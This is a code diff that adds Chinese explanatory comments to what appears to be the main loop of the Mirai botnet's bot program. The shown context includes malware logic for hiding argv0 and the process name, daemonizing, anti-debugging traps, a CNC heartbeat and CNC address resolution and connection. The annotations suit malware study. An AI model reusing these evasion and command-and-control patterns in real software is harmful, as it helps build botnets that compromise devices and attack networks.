@@ -113,7 +113,7 @@ int main(int argc, char **args)
     if (unlock_tbl_if_nodebug(args[0]))
         raise(SIGTRAP);
 #endif
-
+    //确保拥有端口控制权
     ensure_single_instance();
 
     rand_init();
@@ -125,13 +125,13 @@ int main(int argc, char **args)
         util_zero(args[1], util_strlen(args[1]));
     }
 
-    // Hide argv0
+    // Hide argv0　　加密进程路径
     name_buf_len = ((rand_next() % 4) + 3) * 4;
     rand_alphastr(name_buf, name_buf_len);
     name_buf[name_buf_len] = 0;
     util_strcpy(args[0], name_buf);
 
-    // Hide process name
+    // Hide process name　　　加密进程名
     name_buf_len = ((rand_next() % 6) + 3) * 4;
     rand_alphastr(name_buf, name_buf_len);
     name_buf[name_buf_len] = 0;
@@ -144,7 +144,7 @@ int main(int argc, char **args)
     write(STDOUT, "\n", 1);
     table_lock_val(TABLE_EXEC_SUCCESS);
 
-#ifndef DEBUG
+#ifndef DEBUG　　　//关闭标准输入　标准输出　　标准错误
     if (fork() > 0)
         return 0;
     pgid = setsid();
@@ -189,7 +189,7 @@ int main(int argc, char **args)
         else
             mfd = fd_serv;
 
-        // Wait 10s in call to select()
+        // Wait 10s in call to select()　　　　select等待CNC下发命令　　
         timeo.tv_usec = 0;
         timeo.tv_sec = 10;
         nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
@@ -204,7 +204,7 @@ int main(int argc, char **args)
         {
             uint16_t len = 0;
 
-            if (pings++ % 6 == 0)
+            if (pings++ % 6 == 0)   //心跳包　　每隔６０秒发送一次
                 send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
         }
 
@@ -355,6 +355,7 @@ static void anti_gdb_entry(int sig)
     resolve_func = resolve_cnc_addr;
 }
 
+//获取cnc域名和端口
 static void resolve_cnc_addr(void)
 {
     struct resolv_entries *entries;
@@ -381,6 +382,8 @@ static void resolve_cnc_addr(void)
 #endif
 }
 
+
+//建立与CNC的连接
 static void establish_connection(void)
 {
 #ifdef DEBUG
